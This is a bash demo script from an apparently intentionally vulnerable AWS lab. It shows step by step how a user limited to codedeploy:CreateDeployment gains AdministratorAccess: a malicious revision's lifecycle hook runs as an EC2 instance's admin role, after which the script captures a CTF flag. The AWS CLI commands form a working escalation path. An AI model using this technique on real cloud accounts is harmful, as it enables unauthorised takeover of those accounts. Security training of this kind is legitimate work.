#!/bin/bash
set -e

# Demo script for codedeploy-001 - CodeDeploy CreateDeployment to Admin
# This scenario demonstrates how a user with codedeploy:CreateDeployment can escalate
# privileges by deploying a malicious revision whose lifecycle hooks execute as the
# target EC2 instance's admin instance profile (AdministratorAccess), which then
# attaches AdministratorAccess to the starting user.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-codedeploy-001-to-admin-starting-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CodeDeploy CreateDeployment to Admin Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd "$(dirname "$0")/../../../../../.."  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_codedeploy_001_codedeploy_createdeployment.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
APP_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.app_name')
DG_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.deployment_group_name')
ATTACKER_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket')
REVISION_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.revision_key')
FLAG_PARAM=$(echo "$MODULE_OUTPUT" | jq -r '.flag_ssm_parameter_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract admin cleanup credentials for polling deployment status
# (starting user lacks codedeploy:GetDeployment — it is a helpful permission)
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "CodeDeploy App: $APP_NAME"
echo "Deployment Group: $DG_NAME"
echo "Attacker Bucket: $ATTACKER_BUCKET"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}
# use_admin_creds is used for polling codedeploy:GetDeployment — a helpful permission
# that is denied to the starting user during validation runs. The admin user has
# AdministratorAccess and can always call GetDeployment regardless of restrictions.
use_admin_creds() {
    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Custom exit trap — replaces setup_demo_restriction_trap. Best-effort stops the
# in-flight deployment if the demo exits uncleanly (Ctrl+C, SIGTERM, exit 1).
# CodeDeploy deployments that are stuck In-Progress can hold the deployment group
# lock and prevent subsequent demo runs from creating new deployments.
DEPLOYMENT_ID=""
DEMO_COMPLETED=0

_codedeploy_demo_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM

    if [ -n "$DEPLOYMENT_ID" ] && [ "$DEMO_COMPLETED" != "1" ]; then
        echo ""
        echo -e "\033[0;31m[trap] Demo did not complete cleanly — best-effort stop of deployment $DEPLOYMENT_ID\033[0m"
        use_starting_creds
        aws deploy stop-deployment \
            --deployment-id "$DEPLOYMENT_ID" \
            --auto-rollback-enabled \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi

    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _codedeploy_demo_exit_handler EXIT INT TERM

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Wait for IAM credentials to fully propagate after deployment
echo -e "${YELLOW}Waiting 15 seconds for IAM propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation wait complete${NC}\n"

# [OBSERVATION] Step 3: Verify starting user cannot read the SSM flag yet
echo -e "${YELLOW}Step 3: Verifying starting user cannot read the SSM flag (before escalation)${NC}"
echo "Attempting to read flag at: $FLAG_PARAM"
show_cmd "Attacker" "aws ssm get-parameter --name $FLAG_PARAM --query 'Parameter.Value' --output text --region $AWS_REGION"
PROVE_CANT_OUTPUT=$(aws ssm get-parameter \
    --name "$FLAG_PARAM" \
    --query 'Parameter.Value' \
    --output text \
    --region "$AWS_REGION" 2>&1 || true)

if echo "$PROVE_CANT_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Starting user cannot read SSM flag (as expected)${NC}"
else
    echo -e "${RED}Error: Starting user unexpectedly read the SSM flag without escalating.${NC}"
    echo -e "${RED}Remove ssm:GetParameter from the starting principal's Terraform IAM policy.${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 4: Wait for CodeDeploy agent initialization on the target EC2 instance
# The EC2 instance installs the CodeDeploy agent via user_data. Terraform marks the instance
# as 'running' before user_data finishes executing, so the agent needs additional time to
# complete installation and register with CodeDeploy. Without this wait, CreateDeployment
# may succeed but the deployment will immediately fail because no agent is available.
echo -e "${YELLOW}Step 4: Waiting 5 minutes for CodeDeploy agent to initialize on target EC2 instance...${NC}"
echo "The CodeDeploy agent is installed via EC2 user_data which runs concurrently with"
echo "Terraform's resource creation. The agent typically takes 3-4 minutes from instance"
echo "boot to become ready and register with the CodeDeploy service."
sleep 300
echo -e "${GREEN}✓ CodeDeploy agent initialization wait complete${NC}\n"

# [EXPLOIT] Step 5: Create a malicious CodeDeploy deployment
# The revision in the attacker S3 bucket contains an appspec.yml with lifecycle hooks.
# When the CodeDeploy agent on the target EC2 instance executes these hooks, they run
# as the instance's IAM role (pl-prod-codedeploy-001-to-admin-ec2-role) which has
# AdministratorAccess. The hook attaches AdministratorAccess to the starting user.
echo -e "${YELLOW}Step 5: Creating malicious CodeDeploy deployment${NC}"
echo "Attacker bucket: $ATTACKER_BUCKET"
echo "Revision key: $REVISION_KEY"
echo ""
echo "The revision contains an appspec.yml with a lifecycle hook that will:"
echo "  1. Execute as the EC2 instance's admin IAM role"
echo "  2. Call iam:AttachUserPolicy to attach AdministratorAccess to the starting user"
echo ""

# Build the revision JSON — use -c for compact (single-line) output to avoid
# word-splitting when passed as a --revision argument
REVISION_JSON=$(jq -cn \
    --arg bucket "$ATTACKER_BUCKET" \
    --arg key "$REVISION_KEY" \
    '{revisionType: "S3", s3Location: {bucket: $bucket, key: $key, bundleType: "zip"}}')

use_starting_creds
export AWS_REGION=$AWS_REGION

show_attack_cmd "Attacker" "aws deploy create-deployment --application-name $APP_NAME --deployment-group-name $DG_NAME --ignore-application-stop-failures --file-exists-behavior OVERWRITE --region $AWS_REGION --revision <attacker-S3-revision-JSON>"
CREATE_OUTPUT=$(aws deploy create-deployment \
    --application-name "$APP_NAME" \
    --deployment-group-name "$DG_NAME" \
    --ignore-application-stop-failures \
    --file-exists-behavior OVERWRITE \
    --region "$AWS_REGION" \
    --revision "$REVISION_JSON" 2>&1 || true)
echo "$CREATE_OUTPUT"

DEPLOYMENT_ID=$(echo "$CREATE_OUTPUT" | jq -r '.deploymentId // empty')

if [ -z "$DEPLOYMENT_ID" ]; then
    echo -e "${RED}Error: Failed to create deployment. Output above.${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Deployment created: $DEPLOYMENT_ID${NC}\n"

# [OBSERVATION] Step 6: Poll deployment status using admin credentials
# The starting user lacks codedeploy:GetDeployment (a helpful permission denied during
# validation runs). Use admin credentials to monitor when the lifecycle hook has executed.
echo -e "${YELLOW}Step 6: Polling deployment status (using admin credentials — starting user lacks GetDeployment)${NC}"
# Switch to admin credentials for GetDeployment polling
use_admin_creds
export AWS_REGION=$AWS_REGION

MAX_POLLS=30
POLL_COUNT=0
DEPLOYMENT_STATUS="Unknown"
LAST_POLL_OUTPUT=""

echo "Polling every 20s, up to 600s total..."
while [ $POLL_COUNT -lt $MAX_POLLS ]; do
    LAST_POLL_OUTPUT=$(aws deploy get-deployment \
        --deployment-id "$DEPLOYMENT_ID" \
        --region "$AWS_REGION" 2>&1 || true)
    DEPLOYMENT_STATUS=$(echo "$LAST_POLL_OUTPUT" | jq -r '.deploymentInfo.status // "Unknown"')
    echo "$(date +%H:%M:%S) - status: $DEPLOYMENT_STATUS"
    if [ "$DEPLOYMENT_STATUS" = "Succeeded" ] || \
       [ "$DEPLOYMENT_STATUS" = "Failed" ] || \
       [ "$DEPLOYMENT_STATUS" = "Stopped" ]; then
        break
    fi
    sleep 20
    POLL_COUNT=$((POLL_COUNT + 1))
done

if [ "$DEPLOYMENT_STATUS" != "Succeeded" ]; then
    echo -e "${RED}Error: Deployment did not succeed. Final status: $DEPLOYMENT_STATUS${NC}"
    ERROR_INFO=$(echo "$LAST_POLL_OUTPUT" | jq -r '.deploymentInfo.errorInformation // empty' 2>/dev/null || true)
    [ -n "$ERROR_INFO" ] && echo "Error info: $ERROR_INFO"
    exit 1
fi

echo -e "${GREEN}✓ Deployment succeeded — lifecycle hook executed as instance profile (AdministratorAccess)${NC}"
echo -e "${GREEN}✓ Hook attached AdministratorAccess to starting user${NC}\n"

# [EXPLOIT] Step 7: Verify admin access with escalated starting user credentials
echo -e "${YELLOW}Step 7: Verifying administrator access with escalated starting user${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

# Wait for IAM policy attachment to propagate
echo -e "${YELLOW}Waiting 15 seconds for IAM policy attachment to propagate...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation wait complete${NC}\n"

echo "Attempting to list IAM users (requires admin access)..."
show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Escalation succeeded — mark demo as completed now so the exit trap does not
# attempt to stop an already-finished deployment if flag capture fails below.
DEMO_COMPLETED=1
touch "$(dirname "$0")/.demo_active"

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 8: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter.
# SSM's auth cache can lag behind IAM policy attachment; retry up to 5 times.
echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_VALUE=""
for attempt in 1 2 3 4 5; do
    show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM --query 'Parameter.Value' --output text --region $AWS_REGION"
    FLAG_VALUE=$(aws ssm get-parameter \
        --name "$FLAG_PARAM" \
        --query 'Parameter.Value' \
        --output text \
        --region "$AWS_REGION" 2>/dev/null || true)
    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
        break
    fi
    echo -e "${YELLOW}Attempt $attempt: not yet readable — sleeping 10s for SSM auth propagation...${NC}"
    sleep 10
done

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (codedeploy:CreateDeployment only)"
echo "2. Deployed malicious revision from attacker-controlled S3 bucket"
echo "3. CodeDeploy agent on target EC2 executed lifecycle hook as admin instance profile"
echo "4. Hook attached AdministratorAccess to starting user via iam:AttachUserPolicy"
echo "5. Achieved: Full administrator access to the AWS account"
echo "6. CTF Flag: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (codedeploy:CreateDeployment with malicious appspec.yml)"
echo "    → CodeDeploy agent on EC2 executes hook as pl-prod-codedeploy-001-to-admin-ec2-role"
echo "    → (iam:AttachUserPolicy AdministratorAccess) → $STARTING_USER (admin)"
echo "    → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AdministratorAccess policy attached to $STARTING_USER"
echo "- CodeDeploy deployment: $DEPLOYMENT_ID"

echo -e "\n${RED}Warning: AdministratorAccess is still attached to $STARTING_USER${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
